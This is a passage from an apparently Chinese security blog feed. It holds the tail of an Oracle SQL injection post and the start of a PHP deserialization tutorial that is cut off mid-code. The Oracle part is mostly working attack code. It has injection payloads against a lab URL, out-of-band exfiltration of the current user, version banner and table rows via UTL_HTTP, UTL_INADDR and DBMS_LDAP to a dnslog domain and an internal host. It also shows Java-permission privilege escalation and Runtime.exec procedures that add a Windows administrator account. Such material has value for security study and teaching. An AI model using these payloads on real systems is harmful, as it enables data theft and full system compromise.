class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span>)<span class="operator">&gt;</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">null</span>,<span class="number">3</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span>) <span class="keyword">from</span> dual<span class="comment">-- #判断utl_http是否可用</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">utl_http.request向外网主机发送http请求，需要出外网http</span><br><span class="line"><span class="keyword">select</span> utl_http.request(<span class="string">&#x27;dnslog&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><h2 id="Oracle-外带"><a href="#Oracle-外带" class="headerlink" title="Oracle 外带"></a>Oracle 外带</h2><p>需要网络访问权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://oracle.zcv76n.dnslog.cn?data=xxx&#x27;</span>) <span class="keyword">FROM</span> DUAL  <span class="operator">/</span><span class="operator">/</span>需要网络访问权限</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(<span class="string">&#x27;oracle.zcv76n.dnslog.cn&#x27;</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SYS.DBMS_LDAP.INIT(<span class="string">&#x27;oracle.zcv76n.dnslog.cn&#x27;</span>, <span class="number">9000</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://oracle.zcv76n.dnslog.cn?data=xxx&#x27;</span>) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>)) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> RAWTOHEX(banner) <span class="keyword">FROM</span> v$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>)) <span class="keyword">FROM</span> DUAL</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>OWNER <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">FROM</span> DUAL</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>DATA <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> RAWTOHEX(DATA), ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> id<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>name<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>age<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>sex <span class="keyword">AS</span> DATA <span class="keyword">FROM</span>  TEST.DEMO)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> </span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> UTL_HTTP.REQUEST((<span class="keyword">SELECT</span> <span class="string">&#x27;http://172.16.12.187:9000/?data=&#x27;</span><span class="operator">||</span>DATA <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> RAWTOHEX(DATA), ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> id<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>name<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>age<span class="operator">||</span>chr(<span class="number">126</span>)<span class="operator">||</span>sex <span class="keyword">AS</span> DATA <span class="keyword">FROM</span>  TEST.DEMO)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;.oracle.zcv76n.dnslog.cn&#x27;</span>) <span class="keyword">FROM</span> DUAL </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS((<span class="keyword">SELECT</span> RAWTOHEX(banner)<span class="operator">||</span><span class="string">&#x27;.oracle.zcv76n.dnslog.cn&#x27;</span> <span class="keyword">FROM</span> v$version)) <span class="keyword">FROM</span> DUAL</span><br></pre></td></tr></table></figure><p><strong>开启ACL网络访问控制方法：</strong></p><p><strong>首先连接到超级用户</strong></p><ul><li><strong>创建 ACL</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.create_acl (</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">description <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;utl_inaddr&#x27;</span>,</span><br><span class="line">principal <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;TEST&#x27;</span>,   <span class="comment">--此为将来要进行操作的用户</span></span><br><span class="line">is_grant <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">TRUE</span>,</span><br><span class="line">privilege <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;resolve&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>增加权限</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.add_privilege (</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">principal <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;TEST&#x27;</span>,</span><br><span class="line">is_grant <span class="operator">=</span><span class="operator">&gt;</span> <span class="literal">TRUE</span>,</span><br><span class="line">privilege <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;connect&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>授予用户权限</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">dbms_network_acl_admin.assign_acl(</span><br><span class="line">acl <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;UTL_INADDR.xml&#x27;</span>,</span><br><span class="line">host <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><p><strong>登录到TEST用户,即可以使用网络外带</strong></p><h2 id="Oracle-提权"><a href="#Oracle-提权" class="headerlink" title="Oracle 提权"></a>Oracle 提权</h2><p>SELECT * from session_privs;–查看权限 需要JAVA权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">    <span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="string">&#x27;ZTZ&#x27;</span>, <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.io.FilePermission&#x27;</span>, <span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>, <span class="string">&#x27;execute&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line">    <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">OPEN</span> C1;</span><br><span class="line">    <span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line">    <span class="keyword">CLOSE</span> C1;</span><br><span class="line">    DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">  <span class="keyword">END</span>; <span class="comment">--获取JAVA权限</span></span><br></pre></td></tr></table></figure><p>​    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line"><span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="keyword">USER</span>(), <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;writeFileDescriptor&#x27;</span>, <span class="string">&#x27;NULL&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">OPEN</span> C1;</span><br><span class="line"><span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line"><span class="keyword">CLOSE</span> C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line"><span class="keyword">END</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">   POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">   <span class="keyword">CURSOR</span> C1 <span class="keyword">IS</span> <span class="keyword">SELECT</span> <span class="string">&#x27;GRANT&#x27;</span>, <span class="keyword">USER</span>(), <span class="string">&#x27;SYS&#x27;</span>, <span class="string">&#x27;java.lang.RuntimePermission&#x27;</span>,<span class="string">&#x27;readFileDescriptor&#x27;</span>, <span class="string">&#x27;NULL&#x27;</span>, <span class="string">&#x27;ENABLED&#x27;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">OPEN</span> C1;</span><br><span class="line">   <span class="keyword">FETCH</span> C1 BULK <span class="keyword">COLLECT</span> <span class="keyword">INTO</span> POL;</span><br><span class="line">   <span class="keyword">CLOSE</span> C1;</span><br><span class="line">   DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">   <span class="keyword">END</span>; <span class="comment">--获得java.lang.RuntimePermission权限</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">and</span> resolve java source named JAVACMD <span class="keyword">as</span></span><br><span class="line">import java.lang.<span class="operator">*</span>;</span><br><span class="line">import java.io.<span class="operator">*</span>;</span><br><span class="line">public class JAVACMD</span><br><span class="line">&#123;</span><br><span class="line">   public <span class="keyword">static</span> void execmd(String command) throws IOException</span><br><span class="line">   &#123;</span><br><span class="line">           Runtime.getRuntime().<span class="keyword">exec</span>(command);</span><br><span class="line">   &#125;</span><br><span class="line">      &#125;<span class="comment">--创建一个java class然后用procedure包装它进行调用</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">procedure</span> MYJAVACMD(command <span class="keyword">in</span> <span class="type">varchar</span>) <span class="keyword">as</span> <span class="keyword">language</span> java</span><br><span class="line">    name <span class="string">&#x27;JAVACMD.execmd(java.lang.String)&#x27;</span>;<span class="comment">--创建调用的包</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXEC</span> MYJAVACMD(<span class="string">&#x27;net user ka 123.com, /add&#x27;</span>); </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>​     </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">AND</span> RESOLVE Java SOURCE NAMED &quot;JAVACMD&quot; <span class="keyword">AS</span></span><br><span class="line"></span><br><span class="line">import java.lang.<span class="operator">*</span>;</span><br><span class="line"></span><br><span class="line">import java.io.<span class="operator">*</span>;public class JAVACMD</span><br><span class="line"></span><br><span class="line">&#123;public <span class="keyword">static</span> void execCommand (String command) throws IOException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().<span class="keyword">exec</span>(command);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;<span class="operator">/</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">PROCEDURE</span> JAVACMDPROC (p_command <span class="keyword">IN</span> VARCHAR2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">LANGUAGE</span> JAVA</span><br><span class="line"></span><br><span class="line">NAME <span class="string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;<span class="operator">/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;cmd.exe /c net user qingxin qingxin /add&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;cmd.exe /c net localgroup administrators qingxin /add&#x27;</span>);</span><br></pre></td></tr></table></figure><p>​     </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">select</span> SYS.KUPP$PROC.CREATE_MASTER_PROCESS(<span class="string">&#x27;DBMS_SCHEDULER.create_program(&#x27;&#x27;myprog4&#x27;&#x27;,&#x27;&#x27;EXEC UTABLE&#x27;&#x27;,&#x27;&#x27;c:\WINDOWS\system32\cmd.exe /c dir &gt;&gt; c:\my4.txt&#x27;&#x27;,0,TRUE);&#x27;</span>) <span class="keyword">from</span> dual</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">select</span> SYS.KUPP$PROC.CREATE_MASTER_PROCESS(<span class="string">&#x27;DBMS_SCHEDULER.create_job(job_name =&gt; &#x27;&#x27;myjob4&#x27;&#x27;,program_name =&gt; &#x27;&#x27;myprog4&#x27;&#x27;,start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure><p>​<br>​     </p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/4/"/>
      <url>/posts/4/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="0x1-前置基础知识"><a href="#0x1-前置基础知识" class="headerlink" title="0x1.前置基础知识"></a>0x1.前置基础知识</h2><h3 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h3><p>类：定义属性（可以理解为局部变量）和方法（可以理解为函数）的结构</p><p>对象：类的实例化</p><blockquote><p>一个具体的例子：比如一个汽车店，汽车油耗，重量，座位多少，这些称为属性，汽车能开车，能充电，这些称为方法。那对象就是类的实例化，比如奥迪a6就是汽车类里的具体化汽车对象</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栗子1-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span></span>&#123;</span><br><span class="line">   <span class="comment">//定义类属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;zhangsan&#x27;</span>;</span><br><span class="line">   <span class="comment">//定义类方法</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">talk</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name.<span class="string">&quot; is talking with lisi\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$zhangsan</span> = <span class="keyword">new</span> people(); <span class="comment">//实例化对象</span></span><br><span class="line"><span class="variable">$zhangsan</span>-&gt;talk();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>魔术方法：__两个下划线开头的方法称为魔术方法。魔术方法会自动执行。</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>__construct</td><td>构造函数，实例化对象时自动执行，用于初始化</td></tr><tr><td>__destruct</td><td>析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</td></tr><tr><td>__toString</td><td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如echo打印出对象就会调用此方法</td></tr><tr><td>__wakeup()</td><td>使用unserialize时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td>__sleep()</td><td>使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td>__destruct()</td><td>对象被销毁时触发</td></tr><tr><td>__call()</td><td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td></tr><tr><td>__set()</td><td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td></tr><tr><td>__isset()</td><td>当对不可访问属性调用isset()或empty()时触发</td></tr><tr><td>__unset()</td><td>当对不可访问属性调用unset()时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栗子1-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;TestClass&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;this is hello function\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__wakeup()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__construct()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__destruct()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__toString()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__set()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__get()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$zhangsan</span> = <span class="keyword">new</span> Test(); <span class="comment">//实例化对象，调用__construct</span></span><br><span class="line">    <span class="variable">$zhangsan</span>-&gt;name = <span class="number">1</span>; <span class="comment">//改写私有属性，调用__set</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$zhangsan</span>-&gt;name; <span class="comment">//读取私有属性，调用__get</span></span><br><span class="line">    <span class="variable">$zhangsan</span>-&gt;hello(); </span><br><span class="line">    <span class="variable">$ser_zhangsan</span> = serialize(<span class="variable">$zhangsan</span>); </span><br><span class="line">    print_r(unserialize(<span class="variable">$ser_zhangsan</span>)) <span class="comment">//反序列化，调用__wakeup和__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127101356.png"></p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p>对象和数组序列化存储，反序列化输出</p><p>序列化（serialize）:  对象 -&gt; 字符串</p><p>反序列化（unserialize）:  字符串 -&gt; 对象</p><h4 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化-serialize"></a>序列化-serialize</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 